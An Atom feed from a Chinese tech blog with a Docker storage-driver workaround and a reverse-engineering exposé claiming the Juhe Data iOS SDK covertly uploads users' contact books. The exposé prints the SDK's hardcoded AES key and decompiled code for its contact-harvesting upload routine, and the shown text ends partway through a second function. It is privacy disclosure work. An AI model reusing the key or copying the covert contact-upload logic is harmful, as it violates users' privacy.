<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Aveline's Blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="https://blog.swan.im//"/>
  <updated>2015-10-10T18:00:48.000Z</updated>
  <id>https://blog.swan.im//</id>
  
  <author>
    <name><![CDATA[Aveline Swan]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[使用 BIRD 和 ExaBGP 低成本自建 AnyCast 网络]]></title>
    <link href="https://blog.swan.im/build-anycast-network-using-low-cost-vm/"/>
    <id>https://blog.swan.im/build-anycast-network-using-low-cost-vm/</id>
    <published>2015-10-10T18:00:48.000Z</published>
    <updated>2015-10-10T18:00:48.000Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker cpio: 'cap_set_file' 的临时解决方法]]></title>
    <link href="https://blog.swan.im/workaround-of-docker-cap-set-file/"/>
    <id>https://blog.swan.im/workaround-of-docker-cap-set-file/</id>
    <published>2015-07-07T15:02:07.000Z</published>
    <updated>2015-07-08T04:00:23.000Z</updated>
    <content type="html"><![CDATA[<p>目前从 Docker 在 GitHub 上的 <a href="https://github.com/docker/docker/issues/6980" target="_blank" rel="external">Issue #6980 cap_set_file not permitted on aufs storage driver only</a> 来看，似乎只有 Ubuntu 14.04 LTS 上会重现这个问题。</p>
<p>解决方法是：</p>
<p>更换 Docker 的 Storage driver，里面 <a href="https://github.com/docker/docker/issues/6980#issuecomment-94784262" target="_blank" rel="external">@Thorndike</a> 提到更换成 <code>devicemapper</code> 驱动即可，但是很不幸的在我的机器上跑不了，错误信息如下：</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Udev sync <span class="keyword">is</span> <span class="keyword">not</span> supported. This will lead <span class="keyword">to</span> unexpected behavior, data loss <span class="keyword">and</span> errors. <span class="keyword">For</span> more information, see https:<span class="comment">//docs.docker.com/reference/commandline/cli/#daemon-storage-driver-option</span></span><br></pre></td></tr></table></figure>
<p>然而 <a href="https://docs.docker.com/reference/commandline/cli/#daemon-storage-driver-option" target="_blank" rel="external">https://docs.docker.com/reference/commandline/cli/#daemon-storage-driver-option</a> 并没有给出任何有用的信息，还是在 GitHub 上找到了<a href="https://github.com/munkyboy" target="_blank" rel="external">答案</a>：</p>
<p>把 <code>/var/lib/docker/trust/official.json</code> 删掉，然后重启 docker 即可。</p>
<p><strong>嗯，然而对 docker 1.7.0 并不起作用，只能降级到 1.6.2。</strong></p>
<p>可惜我对 <code>devicemapper</code> 曾经在 docker 0.x 时代搞到 kernel panic 这件事儿仍然心有余悸，所以换成了 <code>overlay</code> 驱动。</p>
<p>由于 Trusty 的内核并不支持 <code>overlay</code>，需要首先升级到 Vivid 的内核：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:canonical-kernel-team/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install linux-headers-generic-lts-vivid linux-image-generic-lts-vivid</span><br></pre></td></tr></table></figure>
<p>然后重启使内核生效</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<p>修改 Docker 的 <code>storage driver</code>，在 <code>/etc/default/docker</code> 里加一行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_OPTS=<span class="string">"<span class="variable">$DOCKER_OPTS</span> --storage-driver=overlay"</span></span><br></pre></td></tr></table></figure>
<p>然后重启 docker</p>
<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">service</span> docker <span class="literal">restart</span></span><br></pre></td></tr></table></figure>
<p>重启后执行 <code>docker info</code> 即可看到：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Containers:</span> <span class="number">1</span></span><br><span class="line"><span class="string">Images:</span> <span class="number">19</span></span><br><span class="line">Storage <span class="string">Driver:</span> overlay</span><br><span class="line"> Backing <span class="string">Filesystem:</span> extfs</span><br><span class="line">Execution <span class="string">Driver:</span> native-<span class="number">0.2</span></span><br><span class="line">Logging <span class="string">Driver:</span> json-file</span><br><span class="line">Kernel <span class="string">Version:</span> <span class="number">3.19</span>.0-<span class="number">22</span>-generic</span><br><span class="line">Operating <span class="string">System:</span> Ubuntu <span class="number">14.04</span>.2 LTS</span><br><span class="line"><span class="string">CPUs:</span> <span class="number">16</span></span><br><span class="line">Total <span class="string">Memory:</span> <span class="number">47.16</span> GiB</span><br><span class="line"><span class="string">Name:</span> ci</span><br><span class="line"><span class="string">Registry:</span> <span class="string">https:</span><span class="comment">//index.docker.io/v1/</span></span><br><span class="line"><span class="string">WARNING:</span> No swap limit support</span><br></pre></td></tr></table></figure>
<p>嗯，已经生效啦。再 build 就不会遇到 <code>cap_set_file not permitted</code> 了。</p>
<p>—EOF—</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>目前从 Docker 在 GitHub 上的 <a href="https://github.com/docker/docker/issues/6980" target="_blank" rel="external">Issue #6980 cap_set_file not]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[关于聚合数据窃取用户通讯录的完整分析]]></title>
    <link href="https://blog.swan.im/analysis-of-juhe-data-who-steal-user-contacts-book/"/>
    <id>https://blog.swan.im/analysis-of-juhe-data-who-steal-user-contacts-book/</id>
    <published>2014-11-04T01:17:42.000Z</published>
    <updated>2014-11-04T05:27:14.000Z</updated>
    <content type="html"><![CDATA[<h2 id="起因">起因</h2><p>之前在测试聚合数据的 <a href="https://mega.co.nz/#!pE9iWLxD!bdAA9EA9R6finccP701kQPBjCdkqMtKT2-agKeMb0LA" target="_blank" rel="external">iOS SDK Demo</a> 的时候，发现会请求通讯录权限 … 当时刚睡醒没多久，拿了自己在用的手机，还点了 Allow。</p>
<p>然后我就在 Charles 里发现了一个很大的请求，很好奇，便对 SDK 进行了逆向工程，拿到了解密方法，发现我的整个通讯录都被上传了。</p>
<p>于是我在 V2EX 发了一个帖子 <a href="http://www.v2ex.com/t/142645#reply93" target="_blank" rel="external">请不要使用聚合数据的 SDK</a>，后来被聚合的工作人员看到，他们是<a href="http://www.v2ex.com/t/142966#reply93" target="_blank" rel="external">这样</a>回复的：</p>
<blockquote><br>聚合数据一直致力于为开发者提供更为优质的数据服务，并基于此出发点，推出了聚合数据SDK，该SDK整合了目前聚合数据所提供的所有数据接口，此次aveline反馈的聚合数据SDK读取通讯录问题，实质上是聚合数据<strong>为了方便用户使用由聚合数据提供的短信API服务</strong>。此举对于非短信API服务使用者可能会造成一定不适，考虑到这一点，我们立即对于IOS版与Android版SDK进行了更新，不再要求读取通讯录权限，并对于此前为开发者用户考虑不周的行为表示诚挚歉意，并保证不再进行此类有侵犯用户隐私嫌疑的行为。<br><br><br><br>聚合数据是一个严格恪守行业底线的平台，聚合数据在进行数据分析的过程中极为注重隐私的保护，数据都进行了严格的加密处理，所搜集的数据仅用于改进网站服务本身，并未用于任何非法用途，对于聚合数据注册账号及密码，也进行了严格的加密措施。<br></blockquote>

<p>在 CEO 的微博上是<a href="http://weibo.com/1863475634/Bu3X7qwua" target="_blank" rel="external">这么</a>回复的：</p>
<blockquote><br>昨天晚上收到这个投诉，问了技术人员说是 主要考量是<strong>方便短信api用户</strong> 目前sdk 已连夜更新 彻底删除通讯录读取功能<br></blockquote>

<p>但是实际上并非如此。</p>
<p>来，我们一个一个 SDK 看过去。</p>
<h2 id="分析">分析</h2><p>因为部分版本已经被更新过，新版的确是 <strong>没有</strong> 通讯录读取功能，我们这里以老版本来分析。</p>
<p>有些不了解的读者可能会觉得更新了 SDK 就好了呀，但是其实不是这样子的：SDK 是嵌入在 App 里的，要 App 的开发者更新了，提交到 App Store 之后，终端用户更新了才不会继续被窃取通讯录，但是众所周知苹果审核 App 速度并不快，所以还会有很多使用了这个 SDK 并且用户允许访问通讯录的 App 被利用，继续向聚合数据的服务器上传通讯录。</p>
<p>另外，聚合数据服务器上用于接收上传的通讯录的接口并没有被删掉，而是仍然能够正常处理数据的。你就算为了骗我伪造个 404 也好呀～连伪装都不伪装一下，真是不要脸（不过也很有可能是智商低XD</p>
<h3 id="聚合数据_SDK_(iOS_SDK_v1-0-2)">聚合数据 SDK (iOS SDK v1.0.2)</h3><p>使用 <a href="http://www.unix.com/man-page/osx/1/strings/" target="_blank" rel="external">strings</a> 很清楚的可以看到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings JuheApis | grep -b1 "openid="</span></span><br><span class="line"><span class="number">13015</span>-%@[]</span><br><span class="line"><span class="number">13020</span>:openid=%@imei=%@&amp;lat=%@&amp;lon=%@&amp;os=%@&amp;<span class="built_in">type</span>=%@&amp;model=%@&amp;sim=%@&amp;network=%@&amp;idfa=%@&amp;pname=%@</span><br><span class="line"><span class="number">13109</span>-z@J:<span class="number">70</span>=o*O%~!<span class="number">8</span>-i</span><br></pre></td></tr></table></figure></p>
<p><code>z@J:70=o*O%~!8-i</code> 就是他们加密请求用的密钥啦。</p>
<p>所以，说好的 <code>数据都进行了严格的加密处理</code> 其实就是我们数据加密了但是我们把密钥明文放在里面了哟要看自己拿哟么么哒～</p>
<p>值得一提的是，代码里把用于 AES 的函数命名为了 <code>DESEncrypt</code>，而早期版本中则是直接有一个 <code>libAes.so</code> 的文件，不得不问一下：是不是为了窃取用户数据然后想改下函数名迷惑下反编译的人呢？可是 … 请问你知道汇编嘛？</p>
<p>因为看汇编代码有点头疼，以下给出的代码均为反编译后生成的 C 代码，并非我拿到了他们的源代码哦。</p>
<p>初始化部分：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JHHTTPClient + (void)initJHHTTPClient:(int) OpenId:(id) Path:(id) URLRoot:(id) Method:(id) Key:(id) Success:(id) Failure:(id)</span></span><br><span class="line"><span class="keyword">void</span> __cdecl +[JHHTTPClient initJHHTTPClient:OpenId:Path:URLRoot:Method:Key:Success:Failure:](<span class="keyword">struct</span> JHHTTPClient *self, SEL a2, <span class="keyword">int</span> a3, id a4, id a5, id a6, id a7, id a8, id a9, id a10)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">void</span> *v14; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">void</span> *v16; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">void</span> *v19; <span class="comment">// edi@4</span></span><br><span class="line">  <span class="keyword">void</span> *v20; <span class="comment">// eax@6</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// ebx@6</span></span><br><span class="line">  <span class="keyword">void</span> *v22; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// ebx@10</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// eax@11</span></span><br><span class="line">  <span class="keyword">void</span> *v26; <span class="comment">// ST30_4@11</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// edi@11</span></span><br><span class="line">  <span class="keyword">void</span> *v28; <span class="comment">// eax@13</span></span><br><span class="line">  <span class="keyword">void</span> *v29; <span class="comment">// ST30_4@13</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// edi@13</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [sp+30h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">void</span> *v32; <span class="comment">// [sp+38h] [bp-30h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+3Ch] [bp-2Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [sp+40h] [bp-28h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [sp+44h] [bp-24h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [sp+48h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [sp+4Ch] [bp-1Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v38; <span class="comment">// [sp+50h] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">void</span> *v39; <span class="comment">// [sp+54h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [sp+58h] [bp-10h]@2</span></span><br><span class="line"></span><br><span class="line">  v10 = objc_retain(a4);</span><br><span class="line">  v33 = objc_retain(a5);</span><br><span class="line">  v38 = objc_retain(a6);</span><br><span class="line">  v37 = objc_retain(a7);</span><br><span class="line">  v36 = objc_retain(a8);</span><br><span class="line">  v35 = objc_retain(a9);</span><br><span class="line">  v34 = objc_retain(a10);</span><br><span class="line">  v11 = objc_msgSend(classRef_JuHeInfo, selRef_sharedInfo);</span><br><span class="line">  v39 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v11);</span><br><span class="line">  v31 = v10;</span><br><span class="line">  objc_msgSend(v39, selRef_initInfo_, v10);</span><br><span class="line">  v12 = objc_msgSend(v39, selRef_getDicRawInfo);</span><br><span class="line">  v13 = objc_retainAutoreleasedReturnValue(v12);</span><br><span class="line">  v14 = objc_msgSend(classRef_NSMutableArray, selRef_alloc);</span><br><span class="line">  v32 = objc_msgSend(v14, selRef_init);</span><br><span class="line">  v15 = v33;</span><br><span class="line">  v16 = objc_msgSend(v39, selRef_getDicRawInfo);</span><br><span class="line">  v17 = objc_retainAutoreleasedReturnValue(v16);</span><br><span class="line">  objc_release(v13);</span><br><span class="line">  <span class="keyword">if</span> ( a3 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v40 = v17;</span><br><span class="line">    <span class="keyword">if</span> ( (a3 &amp; <span class="number">0xFFFFFFFE</span>) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = objc_msgSend(classRef_NSMutableDictionary, selRef_alloc);</span><br><span class="line">      v19 = objc_msgSend(v18, selRef_init);</span><br><span class="line">      objc_msgSend(v19, selRef_setDictionary_, v17);</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ABAddressBookGetAuthorizationStatus() == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          objc_msgSend(v39, selRef_fetchAddressBookInfo_, v32);</span><br><span class="line">          v20 = objc_msgSend(v39, selRef_getSMSAddressBookJsonString_, v32);</span><br><span class="line">          v21 = objc_retainAutoreleasedReturnValue(v20);</span><br><span class="line">          objc_msgSend(v19, selRef_setObject_forKey_, v21, CFSTR(<span class="string">"up"</span>));</span><br><span class="line">          objc_release(v21);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        objc_msgSend(v39, selRef_fetchAddressBookInfo_, v32);</span><br><span class="line">        v25 = objc_msgSend(v39, selRef_getSMSAddressBookJsonString_, v32);</span><br><span class="line">        v26 = v19;</span><br><span class="line">        v27 = objc_retainAutoreleasedReturnValue(v25);</span><br><span class="line">        objc_msgSend(v26, selRef_setObject_forKey_, v27, CFSTR(<span class="string">"up"</span>));</span><br><span class="line">        objc_release(v27);</span><br><span class="line">        v19 = v26;</span><br><span class="line">      &#125;</span><br><span class="line">      objc_msgSend(</span><br><span class="line">        classRef_JHHTTPClient,</span><br><span class="line">        selRef_sendEncryptData_URLRoot_Data_Method_Key_Success_Failure_,</span><br><span class="line">        v33,</span><br><span class="line">        v38,</span><br><span class="line">        v19,</span><br><span class="line">        v37,</span><br><span class="line">        v36,</span><br><span class="line">        v35,</span><br><span class="line">        v34);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (a3 &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      v22 = objc_msgSend(classRef_NSMutableDictionary, selRef_alloc);</span><br><span class="line">      v19 = objc_msgSend(v22, selRef_init);</span><br><span class="line">      objc_msgSend(v19, selRef_setDictionary_, v17);</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">5</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ABAddressBookGetAuthorizationStatus() == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          objc_msgSend(v39, selRef_fetchAddressBookInfo_, v32);</span><br><span class="line">          v23 = objc_msgSend(v39, selRef_getSMSAddressBook_, v32);</span><br><span class="line">          v24 = objc_retainAutoreleasedReturnValue(v23);</span><br><span class="line">          objc_msgSend(v19, selRef_setObject_forKey_, v24, CFSTR(<span class="string">"list"</span>));</span><br><span class="line">          objc_release(v24);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        objc_msgSend(v39, selRef_fetchAddressBookInfo_, v32);</span><br><span class="line">        v28 = objc_msgSend(v39, selRef_getSMSAddressBook_, v32);</span><br><span class="line">        v29 = v19;</span><br><span class="line">        v30 = objc_retainAutoreleasedReturnValue(v28);</span><br><span class="line">        objc_msgSend(v29, selRef_setObject_forKey_, v30, CFSTR(<span class="string">"list"</span>));</span><br><span class="line">        objc_release(v30);</span><br><span class="line">        v19 = v29;</span><br><span class="line">      &#125;</span><br><span class="line">      objc_msgSend(</span><br><span class="line">        classRef_JHHTTPClient,</span><br><span class="line">        selRef_sendEncryptJsonData_URLRoot_Data_Method_Key_Success_Failure_,</span><br><span class="line">        v33,</span><br><span class="line">        v38,</span><br><span class="line">        v19,</span><br><span class="line">        v37,</span><br><span class="line">        v36,</span><br><span class="line">        v35,</span><br><span class="line">        v34);</span><br><span class="line">    &#125;</span><br><span class="line">    objc_release(v19);</span><br><span class="line">    v15 = v33;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v40 = v17;</span><br><span class="line">  objc_msgSend(</span><br><span class="line">    classRef_JHHTTPClient,</span><br><span class="line">    selRef_sendEncryptData_URLRoot_Data_Method_Key_Success_Failure_,</span><br><span class="line">    v33,</span><br><span class="line">    v38,</span><br><span class="line">    v17,</span><br><span class="line">    v37,</span><br><span class="line">    v36,</span><br><span class="line">    v35,</span><br><span class="line">    v34);</span><br><span class="line">LABEL_16:</span><br><span class="line">  objc_release(v32);</span><br><span class="line">  objc_release(v40);</span><br><span class="line">  objc_release(v39);</span><br><span class="line">  objc_release(v34);</span><br><span class="line">  objc_release(v35);</span><br><span class="line">  objc_release(v36);</span><br><span class="line">  objc_release(v37);</span><br><span class="line">  objc_release(v38);</span><br><span class="line">  objc_release(v15);</span><br><span class="line">  objc_release(v31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>里面的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objc_msgSend(v39, selRef_fetchAddressBookInfo_, v32);</span><br><span class="line">v23 = objc_msgSend(v39, selRef_getSMSAddressBook_, v32);</span><br></pre></td></tr></table></figure></p>
<p>就是用来获取通讯录的代码。</p>
<p>以下是执行 API 调用的部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JuheAPI - (void)executeWorkWithAPI:(id) parameters:(id) success:(id) failure:(id)</span></span><br><span class="line"><span class="keyword">void</span> __cdecl -[JuheAPI executeWorkWithAPI:parameters:success:failure:](<span class="keyword">struct</span> JuheAPI *self, SEL a2, id a3, id a4, id a5, id a6)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">void</span> *v13; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">void</span> *v14; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">void</span> *v15; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// edi@4</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// ST3C_4@5</span></span><br><span class="line">  <span class="keyword">void</span> *v21; <span class="comment">// [sp+40h] [bp-58h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+44h] [bp-54h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [sp+48h] [bp-50h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [sp+4Ch] [bp-4Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [sp+50h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [sp+54h] [bp-44h]@1</span></span><br><span class="line">  <span class="keyword">void</span> **v27; <span class="comment">// [sp+58h] [bp-40h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [sp+5Ch] [bp-3Ch]@5</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [sp+60h] [bp-38h]@5</span></span><br><span class="line">  <span class="keyword">int</span> (__cdecl *v30)(<span class="keyword">int</span>, <span class="keyword">int</span>); <span class="comment">// [sp+64h] [bp-34h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [sp+68h] [bp-30h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [sp+6Ch] [bp-2Ch]@5</span></span><br><span class="line">  <span class="keyword">void</span> **v33; <span class="comment">// [sp+70h] 